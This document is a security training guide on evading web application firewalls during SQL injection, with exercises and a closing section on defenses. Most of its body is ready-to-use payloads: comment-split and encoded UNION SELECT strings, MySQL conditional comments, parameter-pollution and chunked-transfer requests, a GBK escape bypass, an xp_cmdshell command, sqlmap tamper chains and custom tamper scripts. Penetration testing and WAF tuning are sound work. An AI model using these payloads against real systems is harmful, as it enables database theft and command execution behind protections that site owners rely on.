# Advanced WAF Bypass Techniques for SQL Injection

## Introduction and Objectives

Web Application Firewalls (WAFs) represent one of the most common perimeter defenses against SQL Injection (SQLi) attacks. Modern WAFs employ signature-based detection, positive security models, behavioral analysis, and machine learning to identify and block malicious SQL queries embedded in HTTP requests. However, SQL as a language is remarkably flexible in its syntax -- the same logical query can be expressed in dozens of semantically equivalent but syntactically different ways. This flexibility creates a vast attack surface for bypassing WAF signature rules.

SQL injection remains a critical vulnerability (OWASP Top 3) despite decades of awareness, precisely because WAF bypass techniques evolve alongside WAF detection capabilities. Understanding these bypass techniques is essential for penetration testers who must evaluate the actual security posture of applications behind WAF deployments. A WAF that blocks `UNION SELECT` and `OR 1=1` may still be vulnerable to advanced obfuscation, encoding manipulation, and protocol-level tricks that preserve the SQL semantics while evading detection patterns.

**Learning Objectives:**

- Master comment-based SQL obfuscation techniques for query structure manipulation
- Apply case manipulation and keyword rewriting to evade case-sensitive signature rules
- Use whitespace alternatives (tabs, newlines, linefeeds, comments) to break keyword patterns
- Exploit inline and conditional comments for engine-specific bypass
- Leverage HTTP Parameter Pollution to split SQL payloads across parameters
- Use chunked transfer encoding and multibyte character exploitation for protocol-level bypass
- Operate sqlmap tamper scripts for automated WAF bypass
- Develop custom tamper scripts for target-specific WAF evasion

**Prerequisites:**

- Strong understanding of SQL syntax across MySQL, PostgreSQL, MSSQL, and Oracle
- Experience with SQL injection techniques (UNION-based, boolean-based, time-based, error-based)
- Familiarity with Burp Suite or similar proxy tools
- sqlmap installed and configured
- Access to a test environment with a WAF (ModSecurity recommended for practice)

## Comment-Based Obfuscation

### SQL Comment Types

SQL supports several comment syntaxes that can break up keywords and operators while preserving the query's logical meaning:

| Comment Type | Syntax | Supported By |
|-------------|--------|-------------|
| Single-line | `-- ` (double dash + space) | All databases |
| Single-line | `#` | MySQL |
| Multi-line | `/* */` | All databases |
| Nested | `/*! */` | MySQL (version-specific execution) |
| Conditional | `/*!50100 */` | MySQL (execute if version >= 5.1.0) |

### Breaking Keywords with Comments

Insert comments between keyword characters to break WAF signature patterns:

**Standard UNION SELECT (typically detected):**

```sql
UNION SELECT 1,2,3--
```

**Comment-inserted UNION SELECT:**

```sql
UN/**/ION SE/**/LECT 1,2,3--
```

The MySQL parser treats `UN/**/ION` as `UNION` because comments are stripped during lexical analysis. The WAF sees `UN/**/ION` which does not match its `UNION` keyword pattern.

**Breaking other keywords:**

```sql
SEL/**/ECT * FR/**/OM users
INS/**/ERT IN/**/TO users (name) VAL/**/UES ('admin')
DEL/**/ETE FR/**/OM users WH/**/ERE id=1
UP/**/DATE users SE/**/T password='pwned' WH/**/ERE id=1
```

**Breaking functions:**

```sql
database/**/()
version/**/()
user/**/()
concat/**/(1,2,3)
group_concat/**/(table_name)
```

### Comment Placement Within Queries

Place comments at various positions within the query to maximize obfuscation:

```sql
SELECT/**/1,2,3/**/FROM/**/users
SELECT 1/*! ,*/2/*! ,*/3 FROM users
SELECT*FROM/**/users WHERE/**/1=1
```

### MySQL Version-Specific Comments

MySQL's conditional comment syntax `/*!NNNNN */` executes the enclosed code only if the MySQL version meets the requirement:

```sql
/*!50000 UNION */ SELECT 1,2,3--
/*!50100 SELECT */ * FROM users--
/*!40000 OR */ 1=1--
```

The number after `!` represents the minimum version (50000 = 5.00.00). WAFs that do not understand MySQL conditional comments will not flag the keywords inside them.

**Using version comments to construct full queries:**

```sql
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- -
```

This produces a valid `UNION SELECT` on MySQL 5.0+ while the WAF sees what appears to be commented-out text.

## Case Manipulation

### Mixed Case Keywords

SQL keywords are case-insensitive in most database engines, but WAF signature rules are often case-sensitive. Mixed case bypasses pattern matching that expects lowercase or specific casing:

```sql
UNion SeLeCt 1,2,3--
unIoN sElEcT 1,2,3--
UnIoN SeLeCt 1,2,3--
```

### Combining Case with Comments

Combine case manipulation with comment insertion for layered obfuscation:

```sql
Un/**/IoN Se/**/LeCt 1,2,3--
uN/**/iOn sE/**/lEcT 1,2,3--
```

### Function Name Case Variation

SQL functions are also case-insensitive:

```sql
DaTaBaSe()
VeRsIoN()
UsEr()
CoNcAt(1,2,3)
SlEeP(5)
BeNcHmArK(1000000,MD5(1))
```

## Whitespace Alternatives

### Alternative Whitespace Characters

WAFs often tokenize input based on standard space characters (`0x20`). Alternative whitespace characters can break tokenization while SQL parsers treat them as valid separators:

| Character | Hex | Description | Works In |
|-----------|-----|-------------|----------|
| Space | `0x20` | Standard space | Everywhere |
| Tab | `0x09` | Horizontal tab | MySQL, MSSQL, PostgreSQL |
| Newline | `0x0A` | Line feed (LF) | MySQL, PostgreSQL |
| Carriage Return | `0x0D` | Carriage return (CR) | MySQL, PostgreSQL |
| CRLF | `0x0D0A` | Windows newline | MySQL, MSSQL |
| Vertical Tab | `0x0B` | Vertical tab | MySQL |
| Form Feed | `0x0C` | Page break | MySQL |
| Non-breaking space | `0xA0` | NBSP | MySQL |

**Tab-separated UNION SELECT:**

```sql
UNION%09SELECT%091,2,3--
```

**Newline-separated:**

```sql
UNION%0ASELECT%0A1,2,3--
```

**Mixed whitespace:**

```sql
UNION%0D%0ASELECT%0D%0A1,2,3--
```

**URL-encoded whitespace in GET parameters:**

```
/search?q=1'%09UNION%09SELECT%091,2,3--%09-
```

### Parentheses as Whitespace Replacement

In some SQL dialects, parentheses can serve as delimiters without requiring whitespace:

```sql
UNION(SELECT(1),(2),(3))
SELECT(user)FROM(users)WHERE(id=1)
```

This technique is particularly effective because many WAFs look for `UNION SELECT` as a token pair with whitespace between them.

### Comment as Whitespace

Comments effectively replace whitespace while adding obfuscation:

```sql
UNION/**/SELECT/**/1,/**/2,/**/3--
SELECT/*comment*/1,/*comment*/2,/*comment*/3--
```

## Inline and Conditional Comments

### MySQL Inline Comments

MySQL's `/*!` syntax executes the enclosed SQL code on compatible versions:

```sql
/*!UNION*/ /*!SELECT*/ 1,2,3--
```

### Version-Specific Exploitation

Target specific MySQL versions to include or exclude code:

```sql
-- Execute only on MySQL 5.0+
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- -

-- Execute only on MySQL 5.1+
' /*!50100UNION*/ /*!50100SELECT*/ 1,2,3-- -

-- Execute only on MySQL 5.5+
' /*!50500UNION*/ /*!50500SELECT*/ 1,2,3-- -

-- Execute only on MySQL 5.7+
' /*!50700UNION*/ /*!50700SELECT*/ 1,2,3-- -

-- Execute only on MySQL 8.0+
' /*!80000UNION*/ /*!80000SELECT*/ 1,2,3-- -
```

### Nested Comment Obfuscation

Nest comments to confuse WAF parsers:

```sql
UN/*!I*/ON SEL/*!E*/CT 1,2,3--
SEL/*!EC*/T * FR/*!OM*/ users--
```

Some WAFs attempt to strip comments before applying rules but fail with nested or malformed comment structures:

```sql
UN/**//*!*/ION SEL/**//*!*/ECT 1,2,3--
UN/*!--+/*%0AIN*/ION SEL/*!--+/*%0AIN*/ECT 1,2,3--
```

### MSSQL Comment Techniques

MSSQL supports `--` and `/* */` comments but not MySQL-style conditional comments. Use comment placement creatively:

```sql
EXEC/*comment*/xp_cmdshell/*comment*/'whoami'
UNION/*comment*/SELECT/*comment*/1,2,3--
```

## HTTP Parameter Pollution (HPP)

### HPP for SQL Injection

HTTP Parameter Pollution exploits differences in how WAFs and application servers handle duplicate parameters. Split the SQL payload across multiple parameters with the same name:

```
# Target uses PHP (takes last parameter value)
?id=1&id=UNION SELECT 1,2,3--

# Target uses ASP.NET (takes first or concatenated value)
?id=UNION SELECT 1,2,3--&id=1

# Split across parameters
?id=1' UNION&pay=SELECT 1,2,3--
```

### HPP with Different Parameter Names

If the application uses multiple parameters in the same SQL query:

```
?username=admin'/*&password=*/OR/**/1=1--'
```

The application might construct:

```sql
SELECT * FROM users WHERE username='admin'/*' AND password='*/OR/**/1=1--''
```

Which MySQL evaluates as:

```sql
SELECT * FROM users WHERE username='admin' OR 1=1
```

### HPP with Array Parameters

Some frameworks accept array syntax:

```
?id[]=1' UNION SELECT 1,2,3--&id[]=1
```

If the WAF does not understand array parameter syntax, it may skip inspection of the values.

## Chunked Transfer Encoding

### Understanding Chunked Encoding

HTTP/1.1 supports chunked transfer encoding, where the message body is sent in a series of chunks rather than as a single contiguous block. Each chunk is preceded by its size in hexadecimal:

```http
POST /login HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

4
1' U
4
NION
6
 SELEC
2
T 
2
1,
2
2,3
3
-- 
0

```

### Exploiting Chunked Encoding

Some WAFs buffer the entire request body before inspection, while others process chunks individually. If the WAF processes chunks individually, the SQL keywords are split across chunks and may not trigger signature rules:

**Chunked UNION SELECT:**

```
Transfer-Encoding: chunked

2
1'
e
 UNION SELECT 
e
 1,2,3-- -
0
```

**Splitting `UNION SELECT` across many small chunks:**

```
Transfer-Encoding: chunked

1
U
1
N
1
I
1
O
1
N
1
   
1
S
1
E
1
L
1
E
1
C
1
T
1
   
1
1
1
,
1
2
0
```

### Testing Chunked Encoding Bypass

Use Burp Suite or curl to send chunked requests:

```bash
# Using curl with chunked encoding
printf "1\r\n'\r\n6\r\n UNION\r\n7\r\n SELECT\r\n5\r\n 1,2,3\r\n0\r\n\r\n" | \
  curl -X POST http://target.com/login \
  -H "Transfer-Encoding: chunked" \
  --data-binary @-

# Using Python
import requests

body = "1\r\n'\r\n6\r\n UNION\r\n7\r\n SELECT\r\n5\r\n 1,2,3\r\n0\r\n\r\n"
response = requests.post('http://target.com/login',
    headers={'Transfer-Encoding': 'chunked'},
    data=body)
```

## Multibyte Character Exploitation

### Unicode and Multibyte Encoding

When a WAF and application use different character encodings, multibyte character sequences can be exploited to create characters that bypass WAF rules but are interpreted as SQL syntax by the database.

### GBK/Big5 Encoding Exploitation

In GBK encoding, certain byte sequences that are valid multibyte characters consume the backslash that the application uses for escaping. For example, in PHP with `addslashes()`:

**Input:** `%bf%27` (URL-encoded `0xBF27`)

**PHP processes as:** `0xBF5C27` (the `5C` is the backslash added by `addslashes()`)

**GBK interpretation:** `0xBF5C` is a valid GBK character followed by `0x27` (a single quote)

Result: The backslash is consumed as part of a multibyte character, and the single quote is unescaped.

**Testing GBK bypass:**

```bash
# Test if the target uses GBK encoding
curl "http://target.com/search?q=%bf%27"

# If the response shows a database error, the encoding mismatch is exploitable
curl "http://target.com/search?q=%bf%27 UNION SELECT 1,2,3-- -"
```

### Unicode Normalization Exploitation

Some applications normalize Unicode input (NFC, NFD, NFKC, NFKD). Characters that normalize to ASCII equivalents can bypass WAF rules:

```bash
# Unicode fullwidth characters that normalize to ASCII
ＳＥＬＥＣＴ → SELECT
ＵＮＩＯＮ → UNION

# Using Unicode characters in input
curl "http://target.com/search?q=ＵＮＩＯＮ％20ＳＥＬＥＣＴ"
```

If the application normalizes these to ASCII before passing to the database but the WAF checks the pre-normalized input, the bypass succeeds.

### Double Encoding Exploitation

Double URL encoding can bypass WAFs that decode once:

```
Single encoded: %27 (')
Double encoded: %2527

Single encoded: %55%4E%49%4F%4E (UNION)
Double encoded: %2555%254E%2549%254F%254E
```

**Double-encoded SQL injection:**

```
%2527%2520UNION%2520SELECT%25201,2,3--%2520-
```

If the WAF decodes once (seeing `%27 UNION SELECT 1,2,3-- -`) and blocks it, try triple encoding or partial double encoding where only critical characters are double-encoded.

## Equivalence and Substitution Techniques

### Operator Equivalences

WAFs typically block `OR 1=1` and `AND 1=1`. Use equivalent expressions:

| Blocked | Alternative |
|---------|-------------|
| `OR 1=1` | `OR 1` / `OR TRUE` / `OR 1<>2` / `|| 1` |
| `AND 1=1` | `AND 1` / `AND TRUE` / `AND 1<>0` / `&& 1` |
| `=` | `LIKE` / `REGEXP` / `RLIKE` / `<=>` / `BETWEEN` / `IN` |
| `!=` | `<>` / `NOT LIKE` / `NOT REGEXP` |
| `>` | `NOT BETWEEN 0 AND X` |
| `CONCAT()` | `CONCAT_WS()` / `GROUP_CONCAT()` / `||` (PostgreSQL/Oracle) |

### Keyword Substitutions

| Blocked | Alternative |
|---------|-------------|
| `UNION SELECT` | `UNION ALL SELECT` / `UNION DISTINCT SELECT` / `UNION TABLE` (PostgreSQL 13+) |
| `FROM` | `FROM` with comment: `FR/*!OM*/` |
| `WHERE` | `HAVING` / `GROUP BY` with condition |
| `SLEEP()` | `BENCHMARK()` / `GET_LOCK()` / `WAITFOR DELAY` (MSSQL) |
| `SUBSTRING()` | `MID()` / `SUBSTR()` / `LEFT()` / `RIGHT()` |
| `GROUP_CONCAT()` | `JSON_ARRAYAGG()` / `STRING_AGG()` (PostgreSQL) |
| `INFORMATION_SCHEMA` | `mysql.schema` / `sys.schema` / Performance Schema |

### Comment-Based Function Alternatives

```sql
-- Instead of: SELECT database()
SELECT schema_name FROM information_schema.schemata
SELECT db FROM mysql.db

-- Instead of: UNION SELECT
UNION/*!50000SELECT*/
UNION%0AALL%0ASELECT

-- Instead of: OR 1=1
OR%091
OR/*!50000 1*/
```

## Automated Bypass Tooling: sqlmap Tamper Scripts

### Overview of Tamper Scripts

sqlmap includes a comprehensive library of tamper scripts that automatically transform payloads to bypass WAF rules. Tamper scripts are applied in sequence, allowing you to chain multiple bypass techniques:

```bash
sqlmap -u "http://target.com/search?q=test" --tamper="between,randomcase,space2comment"
```

### Essential Tamper Scripts

**`between.py`** - Replaces `>` with `NOT BETWEEN 0 AND X` and `=` with `BETWEEN X AND X`:

```bash
sqlmap -u "http://target.com/page?id=1" --tamper=between
```

Original: `WHERE id > 5`
Modified: `WHERE id NOT BETWEEN 0 AND 5`

**`randomcase.py`** - Randomizes the case of SQL keywords:

```bash
sqlmap -u "http://target.com/page?id=1" --tamper=randomcase
```

Original: `UNION SELECT 1,2,3`
Modified: `uNIoN sElEcT 1,2,3`

**`space2comment.py`** - Replaces spaces with `/**/`:

```bash
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment
```

Original: `UNION SELECT 1,2,3`
Modified: `UNION/**/SELECT/**/1,2,3`

**`space2dash.py`** - Replaces spaces with `--%0A` (comment + newline):

```bash
sqlmap -u "http://target.com/page?id=1" --tamper=space2dash
```

**`space2hash.py`** - Replaces spaces with `#%0A` (MySQL comment + newline):

```bash
sqlmap -u "http://target.com/page?id=1" --tamper=space2hash
```

**`charencode.py`** - URL-encodes all characters in the payload:

```bash
sqlmap -u "http://target.com/page?id=1" --tamper=charencode
```

**`charunicodeencode.py`** - Unicode-encodes characters in the payload:

```bash
sqlmap -u "http://target.com/page?id=1" --tamper=charunicodeencode
```

**`percentage.py`** - Adds a `%` before each character:

```bash
sqlmap -u "http://target.com/page?id=1" --tamper=percentage
```

Original: `SELECT`
Modified: `%S%E%L%E%C%T`

**`versionedkeywords.py`** - Wraps each keyword with MySQL version comment:

```bash
sqlmap -u "http://target.com/page?id=1" --tamper=versionedkeywords
```

Original: `UNION SELECT`
Modified: `/*!UNION*/ /*!SELECT*/`

**`equaltolike.py`** - Replaces `=` with `LIKE`:

```bash
sqlmap -u "http://target.com/page?id=1" --tamper=equaltolike
```

**`lowercase.py`** - Converts all keywords to lowercase:

```bash
sqlmap -u "http://target.com/page?id=1" --tamper=lowercase
```

**`appendnullbyte.py`** - Appends `%00` to the payload:

```bash
sqlmap -u "http://target.com/page?id=1" --tamper=appendnullbyte
```

### Chaining Tamper Scripts

Combine multiple tamper scripts for maximum obfuscation:

```bash
# Common chain for ModSecurity
sqlmap -u "http://target.com/page?id=1" \
  --tamper="between,randomcase,space2comment,versionedkeywords"

# Chain for strict WAFs
sqlmap -u "http://target.com/page?id=1" \
  --tamper="space2comment,between,randomcase,charencode"

# Chain for MySQL-specific WAFs
sqlmap -u "http://target.com/page?id=1" \
  --tamper="space2hash,versionedkeywords,versionedmorekeywords,equaltolike"

# Chain with double encoding
sqlmap -u "http://target.com/page?id=1" \
  --tamper="charencode,randomcase,space2comment"
```

### Creating Custom Tamper Scripts

Write custom tamper scripts for target-specific bypass techniques. A tamper script is a Python file with a `tamper` function:

```python
#!/usr/bin/env python
# custom_tamper.py
# Custom tamper script: replace keywords with HTML entity equivalents

from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces SQL keywords with HTML entity-encoded equivalents
    """
    if payload:
        payload = payload.replace("UNION", "UN&#73;ON")
        payload = payload.replace("SELECT", "SEL&#69;CT")
        payload = payload.replace("FROM", "FR&#79;M")
        payload = payload.replace("WHERE", "WH&#69;RE")
        payload = payload.replace("AND", "&#65;ND")
        payload = payload.replace("OR", "&#79;R")
        payload = payload.replace(" ", "%09")  # Tab instead of space
    return payload
```

**Custom tamper for comment splitting:**

```python
#!/usr/bin/env python
# comment_split.py

from lib.core.enums import PRIORITY
import re
__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Inserts /*!50000 */ around SQL keywords to exploit MySQL conditional comments
    """
    if payload:
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR',
                     'INSERT', 'UPDATE', 'DELETE', 'DROP', 'TABLE',
                     'DATABASE', 'SCHEMA', 'COLUMN', 'ORDER', 'GROUP']
        for keyword in keywords:
            pattern = re.compile(keyword, re.IGNORECASE)
            payload = pattern.sub('/*!50000' + keyword + '*/', payload)
    return payload
```

**Custom tamper for whitespace diversity:**

```python
#!/usr/bin/env python
# space_mixed.py

import random
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces spaces with random whitespace alternatives
    """
    replacements = ['%09', '%0A', '%0D', '%0C', '/**/', '%0D%0A']
    if payload:
        payload = payload.replace(' ', random.choice(replacements))
    return payload
```

Place custom tamper scripts in `sqlmap/tamper/` directory or specify with `--tamper=/path/to/script.py`.

## Hands-On Practice and Exercises

### Exercise 1: Comment-Based Obfuscation

**Objective**: Bypass WAF detection using SQL comment insertion.

**Setup**: Deploy a MySQL application with ModSecurity and the OWASP CRS.

**Steps**:
1. Confirm basic SQLi detection: `?id=1' UNION SELECT 1,2,3--` is blocked
2. Test comment insertion: `?id=1' UN/**/ION SE/**/LECT 1,2,3--`
3. Test MySQL conditional comments: `?id=1' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--`
4. Test comment-embedded functions: `?id=1' UN/**/ION SE/**/LECT data/**/base(),2,3--`
5. Test nested comments for additional obfuscation
6. Document which comment techniques successfully bypass the WAF

**Expected Result**: Successful UNION SELECT execution through comment-based obfuscation.

### Exercise 2: Whitespace and Encoding Bypass

**Objective**: Exploit whitespace alternatives and encoding to bypass WAF rules.

**Setup**: Same environment as Exercise 1.

**Steps**:
1. Test tab characters: `?id=1'%09UNION%09SELECT%091,2,3--`
2. Test newline characters: `?id=1'%0AUNION%0ASELECT%0A1,2,3--`
3. Test mixed whitespace: `?id=1'%0D%0AUNION%0D%0ASELECT%0D%0A1,2,3--`
4. Test URL encoding of the entire payload
5. Test double URL encoding
6. Test Unicode encoding
7. Test base64-encoded payloads via application-specific features

**Expected Result**: Successful bypass using at least two whitespace or encoding techniques.

### Exercise 3: HPP and Chunked Encoding

**Objective**: Bypass WAF using protocol-level techniques.

**Setup**: Application with multiple parameters and POST-based SQLi.

**Steps**:
1. Test HPP with duplicate parameters: `?id=1&id=' UNION SELECT 1,2,3--`
2. Test HPP across different parameter names in the same query
3. Send a chunked transfer encoding request with SQL keywords split across chunks
4. Test with varying chunk sizes (1-byte, keyword-sized, random)
5. Test combination of chunked encoding and comment obfuscation

**Expected Result**: Successful bypass through parameter pollution or chunked encoding.

### Exercise 4: sqlmap Automated Bypass

**Objective**: Use sqlmap tamper scripts to automate WAF bypass.

**Setup**: WAF-protected application with confirmed SQL injection.

**Steps**:
1. Run sqlmap without tamper to confirm it is blocked
2. Apply individual tamper scripts and record results
3. Chain multiple tamper scripts: `--tamper="between,randomcase,space2comment"`
4. Test the MySQL-specific tamper chain
5. Create a custom tamper script for the specific WAF
6. Compare success rates and performance across tamper configurations

**Expected Result**: Successful automated extraction using chained tamper scripts.

### Exercise 5: Comprehensive WAF Bypass Assessment

**Objective**: Conduct a full WAF bypass assessment and document findings.

**Setup**: Production-equivalent WAF configuration on a vulnerable application.

**Steps**:
1. Fingerprint the WAF product and version
2. Map all injectable parameters
3. Test all bypass techniques systematically (comments, whitespace, encoding, HPP, chunked)
4. For each successful bypass, document the complete payload
5. Develop optimized sqlmap tamper configurations
6. Create a bypass matrix showing technique vs. WAF rule
7. Recommend WAF rule improvements to close identified gaps

**Expected Result**: A comprehensive WAF bypass assessment report with actionable findings and remediation guidance.

## Defense Mechanisms

### Parameterized Queries (Prepared Statements)

The only complete defense against SQL injection, regardless of WAF presence:

```python
# Python with psycopg2
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# Java with PreparedStatement
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, userId);

# PHP with PDO
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
$stmt->execute(['id' => $userId]);
```

### Positive Security Model WAF Rules

Instead of blocking known bad patterns, allow only known good input:

```
# ModSecurity positive rule: only allow numeric IDs
SecRule ARGS:id "!^\d{1,10}$" "id:1001,deny,status:403,msg:'Invalid ID parameter'"
```

### Defense-in-Depth Recommendations

- Deploy parameterized queries as the primary defense (not WAF)
- Use ORM frameworks that abstract SQL query construction
- Apply input validation at the application layer (type checking, length limits)
- Use stored procedures for complex queries
- Implement least-privilege database accounts
- Enable database query logging and anomaly detection
- Deploy WAF as a supplementary defense, not the sole protection
- Regularly test WAF effectiveness with automated SQLi scanning

## References and Resources

### Standards and Documentation

- **OWASP SQL Injection Prevention Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- **OWASP ModSecurity Core Rule Set**: https://owasp.org/www-project-modsecurity-core-rule-set/
- **RFC 7230 - HTTP/1.1 Message Syntax and Routing (Chunked Encoding)**: https://datatracker.ietf.org/doc/html/rfc7230
- **MySQL Reference Manual - Comments**: https://dev.mysql.com/doc/refman/8.0/en/comments.html

### Tools

- **sqlmap**: Automated SQL injection with tamper scripts (https://sqlmap.org/)
- **Burp Suite Professional**: Manual WAF bypass testing (https://portswigger.net/burp)
- **WAFNinja**: Machine learning-based WAF bypass testing (https://github.com/wafninja/wafninja)
- **wafw00f**: WAF fingerprinting (https://github.com/EnableSecurity/wafw00f)
- **bypass-firewalls-by-DNS-history**: WAF bypass via DNS history (https://github.com/vincentcox/bypass-firewalls-by-DNS-history)

### sqlmap Tamper Script Reference

- **Complete tamper script list**: `sqlmap --list-tampers`
- **Tamper script source code**: `https://github.com/sqlmapproject/sqlmap/tree/master/tamper`
- **sqlmap documentation**: https://sqlmap.org/

### Practice Labs

- **PortSwigger Web Security Academy - SQL Injection**: https://portswigger.net/web-security/sql-injection
- **OWASP WebGoat**: SQL injection lessons with WAF scenarios (https://owasp.org/www-project-webgoat/)
- **DVWA with ModSecurity**: Deploy DVWA behind ModSecurity for realistic testing
- **TryHackMe - SQL Injection and WAF Rooms**: https://tryhackme.com/
- **HackTheBox - SQL Injection Challenges**: Various database and WAF configurations

### Books and Research Papers

- **"SQL Injection Attacks and Defense"** by Justin Clarke et al. - Comprehensive SQLi reference
- **"The Web Application Hacker's Handbook"** by Stuttard and Pinto - WAF bypass methodology
- **"WAF Profiling and Evasion"** - Black Hat presentation on systematic WAF bypass
- **"A SQL Injection Walkthrough"** - PortSwigger research paper
- **ModSecurity/OWASP CRS documentation**: Rule analysis for understanding detection patterns

### Additional Reading

- **PayloadsAllTheThings - SQL Injection**: https://github.com/swisskyrepo/PayloadsAllTheThings#sql-injection
- **HackTricks - SQL Injection**: https://book.hacktricks.xyz/pentesting-web/sql-injection
- **PortSwigger Research - SQL Injection Bypassing WAF**: https://portswigger.net/research
- **HackerOne Hacktivity**: SQL injection bypass disclosed reports for real-world examples
- **MySQL Server Team Blog**: MySQL parser behavior and edge cases
